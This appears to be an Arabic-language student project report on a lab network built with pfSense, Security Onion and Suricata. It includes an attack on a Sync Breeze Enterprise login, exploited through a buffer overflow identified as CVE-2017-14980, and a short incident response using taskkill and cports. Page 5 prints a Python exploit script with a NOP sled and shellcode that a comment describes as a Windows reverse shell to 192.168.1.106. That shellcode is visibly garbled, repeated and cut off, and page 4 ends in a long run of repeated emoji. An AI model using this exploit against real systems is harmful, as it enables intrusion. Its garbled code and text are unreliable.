@@ -1,0 +1,261 @@
+=== Page 1 ===
+المقدمة
+
+تعد البيئة الأمنية للشركات أحد العناصر الحيوية التي تضمن حماية البيانات والمعلومات الحساسة من
+الهجمات الإلكترونية والاختراقات. في ظل تزايد التهديدات الإلكترونية وتنوع أساليب الاختراق، أصبح من
+الضروري تعزيز إجراءات الأمان ووضع آليات دفاعية فعالة لتحصين الأنظمة والمعلومات. يتناول هذا
+الفصل دراسة تحليلية تهدف إلى تقييم أمان بيئة شركة من خلال تطبيق هجوم على هذه البيئة، ثم تحليل
+النتائج وتقديم الحلول الأمنية المناسبة لمواجهة مثل هذه التهديدات.
+
+• الأدوات وأنظمة التشغيل المستخدمة:
+
+▪ VMware Workstation Pro
+▪ Windows Server 2019
+▪ Windows Enterprise
+▪ PFSense (Firewall, Router)
+▪ Kali Linux
+▪ Security Onion
+▪ Suricata (IPS / IDS)
+▪ PfBlockerNG (DNS Black Listing)
+▪ Immunity Debugger
+
+▪ VMware Workstation Pro :
+
+سنستخدم في مشروعنا برنامج VMware Workstation 17 Pro لمحاكاة بيئة المشروع. وهو
+برنامج يستخدم لإنشاء وإدارة الأجهزة الافتراضية، يتيح استخدام عدة أنظمة تشغيل في نفس الوقت
+داخل نظام التشغيل الأساسي وهذا مفيد خاص للمطورين والمختبرين ومدراء النظم الذين
+يحتاجون إلى اختبار تطبيقات وبرامج في بيئات مختلفة دون الحاجة لعدة أجهزة.
+
+○ المميزات الرئيسة لـ VMware Workstation Pro :
+1. إنشاء الأجهزة وتحديد مواصفاتها مثل الذاكرة والمعالج والتخزين بكل سهولة.
+2. يدعم تشغيل مجموعة واسعة من أنظمة التشغيل.
+3. يمكن إعداد شبكات افتراضية معقدة داخل البرنامج لاختبار الشبكات والتطبيقات.
+
+13
+
+=== Page 2 ===
+.3 في الخطوة 2 نضبط 8.8.8.8 كخادم DNS الأساسي. ونضيف 4.4.4.4 كخادم DNS الثانوي.
+ننقر على "Next".
+
+Step 1 of 9
+General Information
+On this screen the general pfSense parameters will be set.
+Hostname: pfSense
+EXAMPLE: myserver
+Domain: home.arpa
+EXAMPLE: mycompany.com
+EXAMPLE: myhome.arpa
+Primary DNS Server:
+8.8.8.8
+Secondary DNS Server:
+4.4.4.4
+Override DNS:
+Allow DNS servers to be overridden by DHCP/PPP on WAN
+Next
+
+.4 في الخطوة 3 من 9، نختار منطقة زمنية. ننقر على "Next". في الخطوة 4 من 9، نقوم بإلغاء تحديد
+الخيارين الأخيرين. في الخطوة 5 من 9، ننقر على "Next"
+.5 في الخطوة 6 من 9، نقوم بتعيين كلمة مرور جديدة للـ Admin. ننقر على "Next".
+
+Step 6 of 9
+Set Admin WebGUI Password
+On this screen the admin password will be set, which is used to access the WebGUI and also SSH services if enabled.
+Admin Password:
+Admin Password AGAIN:
+Next
+
+.6 في الخطوة 7 من 9، ننقر على "Reload". في هذه المرحلة، اكتملت إعدادات pfSense ويمكن
+الآن إجراء تغييرات على المنافذ.
+.7 نضغط على تبويب Interfaces
+.a نختار LAN.
+.b بالنسبة لـ 'Description'، قم بتغيير LAN إلى Kali.
+
+26
+
+=== Page 3 ===
+▪ اعداد Security Onion
+
+1. تنزيل Security Onion من الرابط هنا: ISO file
+a. VMware WorkStation
+b. (Typical Installation) << نحدد << ننقر التالي.
+c. Installer disc image file >> SO ISO file path >> Click Next.
+
+New Virtual Machine Wizard
+X
+Guest Operating System Installation:
+A virtual machine is like a physical computer; it needs an operating
+system. How will you install the guest operating system?
+Install from:
+Installer disc:
+No drive available
+Installer disc image file (iso):
+C:\Users\Dev\Cyberwax\OneDrive\Desktop\Cybersec_,
+Browse...
+Could not detect which operating system is in this disc image.
+You will need to specify which operating system will be installed.
+I will install the operating system later.
+The virtual machine will be created with a blank hard disk.
+Help
+< Back
+Next >
+Cancel
+
+2. نختار Linux: CentOS 7 64-Bit and click Next.
+
+New Virtual Machine Wizard
+X
+Select a Guest Operating System
+Which operating system will be installed on this virtual machine?
+Guest operating system
+Microsoft Windows
+Linux
+VMware ESX
+Other
+Version
+CentOS 7 64-bit
+Help
+< Back
+Next >
+Cancel
+
+3. نقوم بتخصيص العتاد كما يلي:
+a. قم بتغيير RAM إلى 4-32 جيجابايت.
+b. أضف Adapters شبكة وقم بتعيينهما لـ Vmnet 4 و Vmnet 5 على التوالي.
+
+40
+
+=== Page 4 ===
+🔒 🔒 192.168.2.11/login
+
+Sync Breeze Enterprise Login
+User Name: [ يوسف ]
+Password: [ •••••••••••• ]
+[ Login ] [ Cancel ]
+
+❖ لاحظنا أن عدد الأحرف محدود في واجهة تسجيل الدخول الحالية.
+
+3. تحليل الطلب (Request)
+- للقيام بذلك بشكل صحيح، يجب علينا أولاً معرفة شكل الطلب (request) الذي يتم إرساله من الواجهة
+إلى التطبيق. سنقوم بالخطوات التالية:
+○ تثبيت التطبيق: تثبيت نسخة من التطبيق على جهاز محلي بحيث يمكننا التحكم الكامل في البيئة وتحليل
+سلوك التطبيق بدقة.
+○ محاولة تسجيل الدخول: سنقوم بمحاولة تسجيل الدخول باستخدام بيانات عشوائية، مثل أسماء
+مستخدمين وكلمات مرور غير متوقعة.
+
+Sync Breeze Enterprise Login
+User Name: [ ahmad ]
+Password: [ •••• ]
+[ Login ] [ Cancel ]
+
+○ التقاط حزم البيانات باستخدام Wireshark: سنستخدم أداة Wireshark لالتقاط وتحليل حزم
+البيانات، السيتيح لنا هذه الأداة معرفة شكل الطلبات المرسلة من واجهة تسجيل الدخول إلى التطبيق.
+
+🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍 🔍
+
+=== Page 5 ===
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+import os
+import sys
+import socket
+from struct import pack
+
+OFFSET = 766
+BUF = b"\x90" * OFFSET + b"\xeb\x08\x90\xeb\x02\x31\xa0\x2f\x2f\x2f\x36"
+
+# reference = `windows/shell_reverse_tcp` [LHOST=192.168.1.106 LPORT=5000] EXECUTABLE=thread if python -c `python -c \x89\xba\xeb\x02\x31\xa0\x2f\x2f\x36`
+
+shellcode = b"\x31\xd2\x52\x68\x61\x6e\x6e\x65\x6c\x6c\x31\x52\x68\x74\x61\x70"
+shellcode += b"\x6c\x6c\x31\xd2\x52\x52\x68\x61\x6e\x6e\x65\x6c\x6c\x31\x52\x68"
+shellcode += b"\x74\x61\x70\x6c\x6c\x31\xd2\x52\x52\x68\x61\x6e\x6e\x65\x6c\x6c"
+shellcode += b"\x31\x52\x68\x74\x61\x70\x6c\x6c\x31\xd2\x52\x52\x68\x61\x6e\x6e"
+shellcode += b"\x65\x6c\x6c\x31\x52\x68\x74\x61\x70\x6c\x6c\x31\xd2\x52\x52\x68\x61"
+shellcode += b"\x6e\x6e\x65\x6c\x6c\x31\x52\x68\x74\x61\x70\x6c\x6c\x31\xd2\x52\x52"
+shellcode += b"\x68\x61\x6e\x6e\x65\x6c\x6c\x31\x52\x68\x74\x61\x70\x6c\x6c\x31\xd2"
+shellcode += b"\x52\x52\x68\x61\x6e\x6e\x65\x6c\x6c\x31\x52\x68\x74\x61\x70\x6c\x6c"
+shellcode += b"\x31\xd2\x52\x52\x68\x61\x6e\x6e\x65\x6c\x6c\x31\x52\x68\x74\x61\x70"
+shellcode += b"\x6c\x6c\x31\xd2\x52\x52\x68\x61\x6e\x6e\x65\x6c\x6c\x31\x52\x68\x74\x61"
+shellcode += b"\x70\x6c\x6c\x31\xd2\x52\x52\x68\x61\x6e\x6e\x65\x6c\x6c\x31\x52\x68\x74"
+shellcode += b"\x61\x70\x6c\x6c\x31\xd2\x52\x52\x68\x61\x6e\x6e\x65\x6c\x6c\x31\x52\x68"
+shellcode += b"\x74\x61\x70\x6c\x6c\x31\xd2\x52\x52\x68\x61\x6e\x6e\x65\x6c\x6c\x31\x52"
+shellcode += b"\x68\x74\x61\x70\x6c\x6c\x31\xd2\x52\x52\x68\x61\x6e\x6e\x65\x6c\x6c\x31"
+shellcode += b"\x52\x68\x74\x61\x70\x6c\x6c\x31\xd2\x52\x52\x68\x61\x6e\x6e\x65\x6c\x6c"
+shellcode += b"\x31\x52\x68\x74\x61\x70\x6c\x6c\x31\xd2\x52\x52\x68\x61\x6e\x6e\x65\x6c"
+shellcode += b"\x6c\x31\x52\x68\x74\x61\x70\x6c\x6c\x31\xd2\x52\x52\x68\x61\x6e\x6e\x65"
+shellcode += b"\x6c\x6c\x31\x52\x68\x74\x61\x70\x6c\x6c\x31\xd2\x52\x52\x68\x61\x6e\x6e"
+shellcode += b"\x65\x6c\x6c\x31\x52\x68\x74\x61\x70\x6c\x6c\x31\xd2\x52\x52\x68\x61\x6e"
+shellcode += b"\x6e\x65\x6c\x6c\x31\x52\x68\x74\x61\x70\x6c\x6c\x31\xd2\x52\x52\x68\x61"
+shellcode += b"\x6e\x6e\x65\x6c\x6c\x31\x52\x68\x74\x61\x70\x6c\x6c\x31\xd2\x52\x52\x68"
+shellcode += b"\x61\x6e\x6e\x65\x6c\x6c\x31\x52\x68\x74\x61\x70\x6c\x6c\x31\xd2\x52\x52"
+shellcode += b"\x68\x61\x6e\x6e\x65\x6c\x6c\x31\x52\x68\x74\x61\x70\x6c\x6c\x31\xd2\x52"
+shellcode += b"\x52\x68\x61\x6e\x6e\x65\x6c\x6c\x31\x52\x68\x74\x61\x70\x6c\x6c\x31\xd2"
+shellcode += b"\x52\x52\x68\x61\x6e\x6e\x65\x6c\x6c\x31\x52\x68\x74\x61\x70\x6c\x6c\x31"
+shellcode += b"\x52\x68\x74\x61\x70\x6c\x6c\x31\xd2\x52\x52\x68\x61\x6e\x6e\x65\x6c\x6c"
+shellcode += b"\x31\x52\x68\x74\x61\x70\x6c\x6c\x31\xd2\x52\x52\x68\x61\x6e\x6e\x65\x6c"
+shellcode += b"\x6c\x31\x52\x68\x74\x61\x70\x6c\x6c\x31\xd2\x52\x52\x68\x61\x6e\x6e\x65"
+shellcode += b"\x6c\x6c\x31\x52\x68\x74\x61\x70\x6c\x6c\x31\xd2\x52\x52\x68\x61\x6e\x6e"
+shellcode += b"\x65\x6c\x6c\x31\x52\x68\x74\x61\x70\x6c\x6c\x31\xd2\x52\x52\x68\x61\x6e"
+shellcode += b"\x6e\x65\x6c\x6c\x31\x52\x68\x74\x61\x70\x6c\x6c\x31\xd2\x52\x52\x68\x61"
+shellcode += b"\x6e\x6e\x65\x6c\x6c\x31\x52\x68\x74\x61\x70\x6c\x6c\x31\xd2\x52\x52\x68"
+shellcode += b"\x61\x6e\x6e\x65\x6c\x6c\x31\x52\x68\x74\x61\x70\x6c\x6c\x31\xd2\x52\x52"
+shellcode += b"\x68\x61\x6e\x6e\x65\x6c\x6c\x31\x52\x68\x74\x61\x70\x6c\x6c\x31\xd2\x52"
+shellcode += b"\x52\x68\x61\x6e\x6e\x65\x6c\x6c\x31\x52\x68\x74\x61\x70\x6c\x6c\x31\xd2"
+shellcode += b"\x52\x52\x68\x61\x6e\x6e\x65\x6c\x6c\x31\x52\x68\x74\x61\x70\x6c\x6c\x31"
+shellcode += b"\x52\x68\x74\x61\x70\x6c\x6c\x31\xd2\x52\x52\x68\x61\x6e\x6e\x65\x6c\x6c"
+shellcode += b"\x31\x52\x68\x74\x61\x70\x6c\x6c\x31\xd2\x52\x52\x68\x61\x6e\x6e\x65\x6c"
+shellcode += b"\x6c\x31\x52\x68\x74\x61\x70\x6c\x6c\x31\xd2\x52\x52\x68\x61\x6e\x6e\x65"
+shellcode += b"\x6c\x6c\x31\x52\x68\x74\x61\x70\x6c\x6c\x31\xd2\x52\x52\x68\x61\x6e\x6e"
+shellcode += b"\x65\x6c\x6c\x31\x52\x68\x74\x61\x70\x6c\x6c\x31\xd2\x52\x52\x68\x61\x6e"
+shellcode += b"\x6e\x65\x6c\x6c\x31\x52\x68\x74\x61\x70\x6c\x6c\x31\xd2\x52\x52\x68\x61"
+shellcode += b"\x6e\x6e\x65\x6c\x6c\x31\x52\x68\x74\x61\x70\x6c\x6c\x31\xd2\x52\x52\x68"
+shellcode += b"\x61\x6e\x6e\x65\x6c\x6c\x31\x52\x68\x74\x61\x70\x6c\x6c\x31\xd2\x52\x52"
+shellcode += b"\x68\x61\x6e\x6e\x65\x6c\x6c\x31\x52\x68\x74\x61\x70\x6c\x6c\x31\xd2\x52"
+shellcode += b"\x52\x68\x61\x6e\x6e\x65\x6c\x6c\x31\x52\x68\x74\x61\x70\x6c\x6c\x31\xd2"
+shellcode += b"\x52\x52\x68\x61\x6e\x6e\x65\x6c\x6c\x31\x52\x68\x74\x61\x70\x6c\x6c\x31"
+shellcode += b"\x52\x68\x74\x61\x70\x6c\x6c\x31\xd2\x52\x52\x68\x61\x6e\x6e\x65\x6c\x6c"
+shellcode += b"\x31\x52\x68\x74\x61\x70\x6c\x6c\x31\xd2\x52\x52\x68\x61\x6e\x6e\x65\x6c"
+shellcode += b"\x6c\x31\x52\x68\x74\x61\x70\x6c\x6c\x31\xd2\x52\x52\x68\x61\x6e\x6e\x65"
+shellcode += b"\x6c\x6c\x31\x52\x68\x74\x61\x70\x6c\x6c\x31\xd2\x52\x52\x68\x61\x6e\x6e"
+shellcode += b"\x65\x6c\x6c\x31\x52\x68\x74\x61\x
+
+=== Page 6 ===
+❖ نلاحظ أن خدمة Sync Breeze Enterprise هي خدمة شرعية موجودة على النظام. وبعد البحث
+عبر الإنترنت، تبين أن النسخة v10.0.28 من هذه الخدمة مصابة بثغرة Buffer Overflow والتى
+تم تسجيلها برقم CVE-2017-14980، لذلك، فإن الإجراء الأمثل يتضمن تعليق العملية وقطع
+الاتصال بها، ومن ثم البحث عن ترقية (Patch) لهذه الثغرة.
+
+3. إيقاف العملية (Kill The Process)
+
+- taskkill /F /PID 2548
+
+taskkill يستخدم لإنهاء عمليات العمل في نظام التشغيل Windows من خلال سطر الأوامر.
+/F: هذا الجزء يحدد أن الأمر يجب أن يكون قاسياً (forceful)، مما يعني أنه سينهي العملية بشكل
+فوري دون الحاجة لتأكيد من المستخدم. إذا لم يتم تحديد هذا الخيار، قد يظهر مربع حوار للتأكيد من
+المستخدم قبل إيقاف العملية.
+PID 2548\: يُحدد هذا الجزء معرف العملية (PID) التي تريد إنهاءها. في هذا السياق، سيتم إيقاف
+العملية التي لها معرف العملية يساوي 2548.
+
+Administrator: Command Prompt
+C:\Users\Administrator> Taskkill /F /PID 2548
+SUCCESS: The process with PID 2548 has been terminated.
+C:\Users\AdeAdministrator>
+
+❖ تم إيقاف العملية.
+4. قطع الاتصال
+
+- cports /close 192.168.2.14 * 192.168.1.106 * 2548
+
+cports /close <Local Address>* <Local Port>* <Remote Address>* <Remote Port>*
+{Process Name/ID}
+
